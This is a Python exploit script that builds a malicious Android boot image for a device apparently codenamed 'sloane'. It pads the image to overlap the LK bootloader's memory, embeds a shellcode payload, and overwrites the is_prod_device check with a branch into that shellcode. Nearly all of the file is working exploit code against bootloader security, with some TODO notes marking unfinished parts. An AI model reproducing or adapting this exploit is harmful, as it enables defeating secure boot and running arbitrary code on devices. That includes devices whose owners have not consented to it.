#!/usr/bin/env python3
import sys
import struct

base = 0x41E00000
forced_addr = 0x40080000

page_size = 0x800 # sloane forces 0x800 bytes

is_prod_device_offset = 0x42948

shellcode_sz = 0x1000 # TODO: check size

lk_offset = base - forced_addr

inject_offset = lk_offset - shellcode_sz - 0x100

inject_addr = forced_addr + inject_offset + 0x10
shellcode_addr = forced_addr + inject_offset + 0x100

kernel_size = lk_offset + is_prod_device_offset + 0x6
if kernel_size % page_size != 0:
    kernel_size = ((kernel_size // page_size) + 1) * page_size
boot_size = kernel_size + (2 * page_size)

def main():
    if len(sys.argv) < 2:
        args = ["", "../bin/lk.bin", "build/payload.bin", "../bin/boot.hdr", "../bin/boot.payload"]
    elif len(sys.argv) < 3:
        args = ["", "../bin/lk.bin", "build/payload.bin", sys.argv[1] ]
    elif len(sys.argv) < 4:
        args = ["", "../bin/lk.bin", "build/payload.bin", sys.argv[1], sys.argv[2] ]
    else:
        args = sys.argv

    with open(args[1], "rb") as fin:
        orig = fin.read()

    hdr = b"ANDROID!"
    hdr += struct.pack("<II", kernel_size, forced_addr)
    hdr += bytes.fromhex("0000000000000044000000000000F0400000004800080000000000002311040E00000000000000000000000000000000")
    hdr += b"bootopt=64S3,32N2,32N2" # This is so that TZ still inits, but LK thinks kernel is 32-bit - need to fix too!

    want_len = shellcode_addr - inject_addr + page_size + 0x10
    hdr += b"\x00" * ((want_len + inject_offset) - len(hdr))

    with open(args[2], "rb") as fin:
        shellcode = fin.read()

    if len(shellcode) > shellcode_sz:
        raise RuntimeError("shellcode too big!")

    hdr += shellcode

    payload_block_end = len(hdr)

    hdr += b"\x00" * (lk_offset + page_size - len(hdr) - 0x200)

    hdr += orig[:is_prod_device_offset + 0x200]
    hdr += b"\xbc\xf7\x5a\xeb" # blx shellcode_addr
    hdr += orig[is_prod_device_offset + 0x200 + 4:]

    payload_block = (inject_offset // 0x200)
    print("Payload Address: " + hex(shellcode_addr))
    print("Payload Block:   " + str(payload_block))
    print("Part Size:       %d ( %.2f MiB / %d Blocks)" % (len(hdr), len(hdr)/1024/1024, (len(hdr)//0x200) + 1))
    if len(args) > 4:
        print("Writing " + args[3] + "...")
        with open(args[3], "wb") as fout:
            fout.write(hdr[:0x100])
        print("Writing " + args[4] + "...")
        with open(args[4], "wb") as fout:
            fout.write(hdr[payload_block * 0x200:])
    else:
        print("Writing " + args[3] + "...")
        with open(args[3], "wb") as fout:
            fout.write(hdr)
        print("Writing " + args[3] + ".lk.bin ...")
        with open(args[3] + ".lk.bin", "wb") as fout:
            fout.write(hdr[lk_offset + page_size - 0x200:])


if __name__ == "__main__":
    main()
